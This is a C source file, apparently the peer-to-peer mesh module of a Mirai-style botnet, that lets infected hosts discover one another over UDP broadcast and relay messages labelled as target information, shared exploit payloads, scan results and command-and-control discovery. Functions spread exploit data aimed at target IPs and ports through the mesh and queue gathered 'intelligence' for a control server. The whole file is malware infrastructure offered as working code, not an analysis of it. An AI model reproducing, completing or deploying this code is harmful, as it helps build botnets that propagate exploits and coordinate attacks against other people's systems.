#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <pthread.h>
#include <signal.h>
#include "includes.h"
#include "p2p_mesh.h"
#include "rand.h"
#include "util.h"
#include "table.h"
static struct p2p_peer peers[P2P_MAX_PEERS];
static uint32_t peer_count = 0;
static pthread_mutex_t p2p_mutex = PTHREAD_MUTEX_INITIALIZER;
static volatile int p2p_running = 0;
static pthread_t p2p_listen_thread = 0;
static pthread_t p2p_broadcast_thread = 0;
static int p2p_socket = -1;
static struct target_info cnc_report_queue[1000];
static uint32_t cnc_report_count = 0;
static pthread_mutex_t cnc_report_mutex = PTHREAD_MUTEX_INITIALIZER;
static void p2p_send_to_peer(struct p2p_peer *peer, struct p2p_message *msg)
{
    if(!peer || !msg) return;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) return;
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = peer->ip;
    addr.sin_port = htons(peer->port);
    char buffer[P2P_MESSAGE_MAX_SIZE + 16];
    int pos = 0;
    buffer[pos++] = msg->type;
    *(uint16_t*)(buffer + pos) = htons(msg->length);
    pos += 2;
    *(uint32_t*)(buffer + pos) = htonl(msg->timestamp);
    pos += 4;
    *(ipv4_t*)(buffer + pos) = msg->sender_ip;
    pos += 4;
    *(uint16_t*)(buffer + pos) = htons(msg->sender_port);
    pos += 2;
    uint16_t data_len = (msg->length > P2P_MESSAGE_MAX_SIZE) ? P2P_MESSAGE_MAX_SIZE : msg->length;
    if(data_len > 0) {
        memcpy(buffer + pos, msg->data, data_len);
        pos += data_len;
    }
    int sent = sendto(fd, buffer, pos, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    if(sent < 0) {
        pthread_mutex_lock(&p2p_mutex);
        for(uint32_t i = 0; i < peer_count; i++) {
            if(peers[i].ip == peer->ip && peers[i].port == peer->port) {
                peers[i].active = FALSE;
                break;
            }
        }
        pthread_mutex_unlock(&p2p_mutex);
    }
    close(fd);
}
static void p2p_broadcast_message(struct p2p_message *msg)
{
    if(!msg) return;
    pthread_mutex_lock(&p2p_mutex);
    uint32_t count = peer_count;
    struct p2p_peer local_peers[P2P_MAX_PEERS];
    memcpy(local_peers, peers, sizeof(peers));
    pthread_mutex_unlock(&p2p_mutex);
    uint32_t max_broadcast = (count > 20) ? 20 : count;
    for(uint32_t i = 0; i < max_broadcast; i++) {
        if(local_peers[i].active && 
           (local_peers[i].ip != msg->sender_ip || local_peers[i].port != msg->sender_port)) {
            p2p_send_to_peer(&local_peers[i], msg);
            usleep(1000); 
        }
    }
}
static void p2p_add_peer(ipv4_t ip, uint16_t port, uint8_t version, const char *arch)
{
    pthread_mutex_lock(&p2p_mutex);
    for(uint32_t i = 0; i < peer_count; i++) {
        if(peers[i].ip == ip && peers[i].port == port) {
            peers[i].last_seen = time(NULL);
            peers[i].active = TRUE;
            pthread_mutex_unlock(&p2p_mutex);
            return;
        }
    }
    if(peer_count < P2P_MAX_PEERS) {
        struct p2p_peer *p = &peers[peer_count++];
        p->ip = ip;
        p->port = port;
        p->version = version;
        p->last_seen = time(NULL);
        p->active = TRUE;
        if(arch) {
            strncpy(p->arch, arch, sizeof(p->arch) - 1);
        }
    }
    pthread_mutex_unlock(&p2p_mutex);
}
void p2p_mesh_handle_message(struct p2p_message *msg)
{
    if(!msg) return;
    if(msg->type > P2P_MSG_SYNC_RESPONSE) {
        return;
    }
    p2p_add_peer(msg->sender_ip, msg->sender_port, 1, NULL);
    switch(msg->type) {
        case P2P_MSG_PING:
            {
                struct p2p_message pong;
                pong.type = P2P_MSG_PONG;
                pong.length = 0;
                pong.timestamp = time(NULL);
                pong.sender_ip = LOCAL_ADDR;
                pong.sender_port = P2P_MESH_PORT;
                pthread_mutex_lock(&p2p_mutex);
                for(uint32_t i = 0; i < peer_count; i++) {
                    if(peers[i].ip == msg->sender_ip && peers[i].port == msg->sender_port) {
                        p2p_send_to_peer(&peers[i], &pong);
                        break;
                    }
                }
                pthread_mutex_unlock(&p2p_mutex);
            }
            break;
        case P2P_MSG_PONG:
            p2p_add_peer(msg->sender_ip, msg->sender_port, 1, NULL);
            break;
        case P2P_MSG_TARGET_INFO:
            {
                if(msg->length >= sizeof(struct target_info)) {
                    struct target_info *info = (struct target_info *)msg->data;
                    pthread_mutex_lock(&cnc_report_mutex);
                    if(cnc_report_count < 1000) {
                        memcpy(&cnc_report_queue[cnc_report_count++], info, sizeof(struct target_info));
                    }
                    pthread_mutex_unlock(&cnc_report_mutex);
                }
            }
            {
                struct p2p_message forward_msg = *msg;
                forward_msg.sender_ip = LOCAL_ADDR;
                forward_msg.sender_port = P2P_MESH_PORT;
                p2p_broadcast_message(&forward_msg);
            }
            break;
        case P2P_MSG_EXPLOIT_SHARE:
            {
                if(msg->length >= sizeof(struct target_info)) {
                    pthread_mutex_lock(&cnc_report_mutex);
                    if(cnc_report_count < 1000) {
                        struct target_info *info = &cnc_report_queue[cnc_report_count++];
                        memcpy(info, msg->data, sizeof(struct target_info));
                    }
                    pthread_mutex_unlock(&cnc_report_mutex);
                }
            }
            {
                struct p2p_message forward_msg = *msg;
                forward_msg.sender_ip = LOCAL_ADDR;
                forward_msg.sender_port = P2P_MESH_PORT;
                p2p_broadcast_message(&forward_msg);
            }
            break;
        case P2P_MSG_SCAN_RESULT:
            {
                if(msg->length >= sizeof(struct target_info)) {
                    pthread_mutex_lock(&cnc_report_mutex);
                    if(cnc_report_count < 1000) {
                        struct target_info *info = &cnc_report_queue[cnc_report_count++];
                        memcpy(info, msg->data, sizeof(struct target_info));
                    }
                    pthread_mutex_unlock(&cnc_report_mutex);
                }
            }
            {
                struct p2p_message forward_msg = *msg;
                forward_msg.sender_ip = LOCAL_ADDR;
                forward_msg.sender_port = P2P_MESH_PORT;
                p2p_broadcast_message(&forward_msg);
            }
            break;
        case P2P_MSG_CNC_DISCOVERY:
            {
                if(msg->length >= 6) {
                    ipv4_t cnc_ip = *(ipv4_t*)msg->data;
                    uint16_t cnc_port = ntohs(*(uint16_t*)(msg->data + 4));
                }
            }
            {
                struct p2p_message forward_msg = *msg;
                forward_msg.sender_ip = LOCAL_ADDR;
                forward_msg.sender_port = P2P_MESH_PORT;
                p2p_broadcast_message(&forward_msg);
            }
            break;
        case P2P_MSG_SYNC_REQUEST:
        case P2P_MSG_SYNC_RESPONSE:
            {
                struct p2p_message forward_msg = *msg;
                forward_msg.sender_ip = LOCAL_ADDR;
                forward_msg.sender_port = P2P_MESH_PORT;
                p2p_broadcast_message(&forward_msg);
            }
            break;
        default:
            break;
    }
}
static void *p2p_listen_worker(void *arg)
{
    char buffer[P2P_MESSAGE_MAX_SIZE + 16];
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);
    while(p2p_running) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(p2p_socket, &read_fds);
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        if(select(p2p_socket + 1, &read_fds, NULL, NULL, &tv) > 0) {
            int n = recvfrom(p2p_socket, buffer, sizeof(buffer), 0,
                           (struct sockaddr *)&client_addr, &client_len);
            if(n > 0) {
                struct p2p_message msg;
                memset(&msg, 0, sizeof(msg));
                int pos = 0;
                if(n < 13) continue; 
                msg.type = buffer[pos++];
                msg.length = ntohs(*(uint16_t*)(buffer + pos));
                pos += 2;
                msg.timestamp = ntohl(*(uint32_t*)(buffer + pos));
                pos += 4;
                msg.sender_ip = *(ipv4_t*)(buffer + pos);
                pos += 4;
                msg.sender_port = ntohs(*(uint16_t*)(buffer + pos));
                pos += 2;
                if(msg.length > P2P_MESSAGE_MAX_SIZE || msg.length > n - pos) {
                    continue; 
                }
                if(msg.length > 0) {
                    memcpy(msg.data, buffer + pos, msg.length);
                }
                if(msg.sender_ip != LOCAL_ADDR || msg.sender_port != P2P_MESH_PORT) {
                    p2p_mesh_handle_message(&msg);
                }
            }
        }
    }
    return NULL;
}
static void *p2p_broadcast_worker(void *arg)
{
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);
    while(p2p_running) {
        struct p2p_message ping;
        ping.type = P2P_MSG_PING;
        ping.length = 0;
        ping.timestamp = time(NULL);
        ping.sender_ip = LOCAL_ADDR;
        ping.sender_port = P2P_MESH_PORT;
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if(fd >= 0) {
            int broadcast = 1;
            setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = INADDR_BROADCAST;
            addr.sin_port = htons(P2P_MESH_PORT);
            char buffer[16];
            int pos = 0;
            buffer[pos++] = ping.type;
            *(uint16_t*)(buffer + pos) = htons(ping.length);
            pos += 2;
            *(uint32_t*)(buffer + pos) = htonl(ping.timestamp);
            pos += 4;
            *(ipv4_t*)(buffer + pos) = ping.sender_ip;
            pos += 4;
            *(uint16_t*)(buffer + pos) = htons(ping.sender_port);
            pos += 2;
            sendto(fd, buffer, pos, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
            close(fd);
        }
        pthread_mutex_lock(&p2p_mutex);
        uint32_t now = time(NULL);
        uint32_t removed = 0;
        for(uint32_t i = 0; i < peer_count; i++) {
            if(now - peers[i].last_seen > 300) { 
                peers[i].active = FALSE;
                removed++;
            }
        }
        if(removed > 10 && peer_count > 20) {
            uint32_t write_idx = 0;
            for(uint32_t i = 0; i < peer_count; i++) {
                if(peers[i].active) {
                    if(write_idx != i) {
                        peers[write_idx] = peers[i];
                    }
                    write_idx++;
                }
            }
            peer_count = write_idx;
        }
        pthread_mutex_unlock(&p2p_mutex);
        sleep(30); 
    }
    return NULL;
}
void p2p_mesh_init(void)
{
    peer_count = 0;
    cnc_report_count = 0;
    p2p_running = 0;
    memset(peers, 0, sizeof(peers));
    memset(cnc_report_queue, 0, sizeof(cnc_report_queue));
}
void p2p_mesh_start(void)
{
    if(p2p_running) return;
    p2p_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if(p2p_socket < 0) return;
    int reuse = 1;
    setsockopt(p2p_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(P2P_MESH_PORT);
    if(bind(p2p_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(p2p_socket);
        p2p_socket = -1;
        return;
    }
    fcntl(p2p_socket, F_SETFL, O_NONBLOCK | fcntl(p2p_socket, F_GETFL, 0));
    p2p_running = 1;
    pthread_create(&p2p_listen_thread, NULL, p2p_listen_worker, NULL);
    pthread_create(&p2p_broadcast_thread, NULL, p2p_broadcast_worker, NULL);
}
void p2p_mesh_stop(void)
{
    if(!p2p_running) return;
    p2p_running = 0;
    usleep(100000);
    if(p2p_socket >= 0) {
        shutdown(p2p_socket, SHUT_RDWR);
        close(p2p_socket);
        p2p_socket = -1;
    }
    if(p2p_listen_thread) {
        pthread_cancel(p2p_listen_thread);
        pthread_join(p2p_listen_thread, NULL);
        p2p_listen_thread = 0;
    }
    if(p2p_broadcast_thread) {
        pthread_cancel(p2p_broadcast_thread);
        pthread_join(p2p_broadcast_thread, NULL);
        p2p_broadcast_thread = 0;
    }
    pthread_mutex_lock(&cnc_report_mutex);
    cnc_report_count = 0;
    memset(cnc_report_queue, 0, sizeof(cnc_report_queue));
    pthread_mutex_unlock(&cnc_report_mutex);
}
void p2p_mesh_broadcast_target_info(struct target_info *info)
{
    if(!info) return;
    struct p2p_message msg;
    msg.type = P2P_MSG_TARGET_INFO;
    msg.length = sizeof(struct target_info);
    msg.timestamp = time(NULL);
    msg.sender_ip = LOCAL_ADDR;
    msg.sender_port = P2P_MESH_PORT;
    memcpy(msg.data, info, sizeof(struct target_info));
    p2p_broadcast_message(&msg);
    pthread_mutex_lock(&cnc_report_mutex);
    if(cnc_report_count < 1000) {
        memcpy(&cnc_report_queue[cnc_report_count++], info, sizeof(struct target_info));
    }
    pthread_mutex_unlock(&cnc_report_mutex);
}
void p2p_mesh_broadcast_exploit(const char *exploit_data, uint16_t size, ipv4_t target_ip, uint16_t target_port)
{
    if(!exploit_data || size == 0) return;
    struct target_info info;
    memset(&info, 0, sizeof(info));
    info.target_ip = target_ip;
    info.target_port = target_port;
    info.protocol = 0; 
    info.vulnerability_type = 0;
    info.exploit_size = (size < sizeof(info.exploit_data)) ? size : sizeof(info.exploit_data);
    memcpy(info.exploit_data, exploit_data, info.exploit_size);
    info.success_rate = 0;
    info.last_tested = time(NULL);
    struct p2p_message msg;
    msg.type = P2P_MSG_EXPLOIT_SHARE;
    msg.length = sizeof(struct target_info);
    msg.timestamp = time(NULL);
    msg.sender_ip = LOCAL_ADDR;
    msg.sender_port = P2P_MESH_PORT;
    memcpy(msg.data, &info, sizeof(struct target_info));
    p2p_broadcast_message(&msg);
    pthread_mutex_lock(&cnc_report_mutex);
    if(cnc_report_count < 1000) {
        memcpy(&cnc_report_queue[cnc_report_count++], &info, sizeof(struct target_info));
    }
    pthread_mutex_unlock(&cnc_report_mutex);
}
void p2p_mesh_broadcast_scan_result(ipv4_t target_ip, uint16_t target_port, uint8_t protocol, const char *details)
{
    if(!details) details = "";
    struct target_info info;
    memset(&info, 0, sizeof(info));
    info.target_ip = target_ip;
    info.target_port = target_port;
    info.protocol = protocol;
    info.vulnerability_type = 0;
    size_t details_len = strlen(details);
    info.exploit_size = (details_len > sizeof(info.exploit_data)) ? sizeof(info.exploit_data) : details_len;
    if(info.exploit_size > 0) {
        memcpy(info.exploit_data, details, info.exploit_size);
    }
    info.success_rate = 0;
    info.last_tested = time(NULL);
    struct p2p_message msg;
    msg.type = P2P_MSG_SCAN_RESULT;
    msg.length = sizeof(struct target_info);
    msg.timestamp = time(NULL);
    msg.sender_ip = LOCAL_ADDR;
    msg.sender_port = P2P_MESH_PORT;
    memcpy(msg.data, &info, sizeof(struct target_info));
    p2p_broadcast_message(&msg);
    pthread_mutex_lock(&cnc_report_mutex);
    if(cnc_report_count < 1000) {
        memcpy(&cnc_report_queue[cnc_report_count++], &info, sizeof(struct target_info));
    }
    pthread_mutex_unlock(&cnc_report_mutex);
}
void p2p_mesh_discover_cnc(void)
{
    struct p2p_message msg;
    msg.type = P2P_MSG_CNC_DISCOVERY;
    msg.length = 0;
    msg.timestamp = time(NULL);
    msg.sender_ip = LOCAL_ADDR;
    msg.sender_port = P2P_MESH_PORT;
    p2p_broadcast_message(&msg);
}
struct p2p_peer *p2p_mesh_get_peers(uint32_t *count)
{
    pthread_mutex_lock(&p2p_mutex);
    *count = peer_count;
    pthread_mutex_unlock(&p2p_mutex);
    return peers;
}
struct target_info *p2p_mesh_get_intelligence_queue(uint32_t *count)
{
    pthread_mutex_lock(&cnc_report_mutex);
    *count = cnc_report_count;
    if(*count == 0) {
        pthread_mutex_unlock(&cnc_report_mutex);
        return NULL;
    }
    struct target_info *result = malloc(sizeof(struct target_info) * cnc_report_count);
    if(result) {
        memcpy(result, cnc_report_queue, sizeof(struct target_info) * cnc_report_count);
        cnc_report_count = 0; 
    }
    pthread_mutex_unlock(&cnc_report_mutex);
    return result;
}
void p2p_mesh_report_to_cnc(void)
{
    uint32_t count = 0;
    struct target_info *infos = p2p_mesh_get_intelligence_queue(&count);
    if(count == 0 || !infos) return;
    free(infos); 
}
